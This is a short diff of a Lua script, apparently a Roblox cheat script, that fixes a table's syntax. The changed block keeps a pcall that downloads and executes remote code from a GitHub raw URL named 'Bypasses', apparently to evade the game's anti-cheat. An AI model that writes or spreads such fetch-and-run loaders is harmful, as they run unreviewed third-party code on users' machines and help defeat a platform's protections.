@@ -18,7 +18,11 @@ repeat wait() until game:IsLoaded()
 
 local Poisoned = {
     cc = {
-        Enabled = false,pcall(function()
+        Enabled = false,
+    }
+}
+
+pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/RickWare.CC/refs/heads/main/Misc/Bypasses",true))()
 end)
 
@@ -2543,3 +2547,4 @@ end)
 end
 end
 cooked(true)
+
